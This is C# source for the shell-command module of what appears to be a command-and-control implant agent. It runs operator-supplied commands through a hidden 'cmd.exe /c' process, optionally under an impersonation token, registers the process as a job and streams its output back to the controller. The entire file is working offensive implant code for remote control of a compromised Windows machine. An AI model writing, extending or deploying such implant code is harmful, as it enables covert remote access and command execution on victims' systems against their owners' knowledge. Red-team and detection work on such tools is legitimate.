using Agent.Helpers;
using Agent.Models;
using Agent.Service;
using Shared;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using WinAPI;
using WinAPI.Wrapper;

namespace Agent.Commands
{
    public class ShellCommand : AgentCommand
    {
        public override CommandId Command => CommandId.Shell;

        public override async Task InnerExecute(AgentTask task, AgentCommandContext context, CancellationToken token)
        {
            if (!task.HasParameter(ParameterId.Cmd))
            {
                context.Error($"Command is mandatory!");
                return;
            }

            var arg = task.GetParameter<string>(ParameterId.Cmd);
            var cmd = $@"c:\windows\system32\cmd.exe /c {arg}";

            var creationParms = new ProcessCreationParameters()
            {
                Command = cmd,
                RedirectOutput = true,
                CreateNoWindow = true,
                CurrentDirectory = Environment.CurrentDirectory
            };


            if (context.Agent.ImpersonationToken != IntPtr.Zero)
                creationParms.Token = context.Agent.ImpersonationToken;

            var procResult = APIWrapper.CreateProcess(creationParms);

            if (procResult.ProcessId == 0)
            {
                context.Error("Process start failed!");
                return;
            }

            this.JobId = procResult.ProcessId;
            var jobService = ServiceProvider.GetService<IJobService>();
            jobService.RegisterJob(procResult.ProcessId, "Shell " + arg);

            Stopwatch stopwatch = new Stopwatch();
            stopwatch.Start();
            if (creationParms.RedirectOutput)
                APIWrapper.ReadPipeToEnd(procResult.OutPipeHandle, output =>
                {
                    context.AppendResult(output, false);
                    if (stopwatch.ElapsedMilliseconds > context.ConfigService.JobResultDelay)
                    {
                        context.Agent.SendTaskResult(context.Result).Wait();
                        context.ClearResult();
                        stopwatch.Restart();
                    }
                });
        }
    }
}
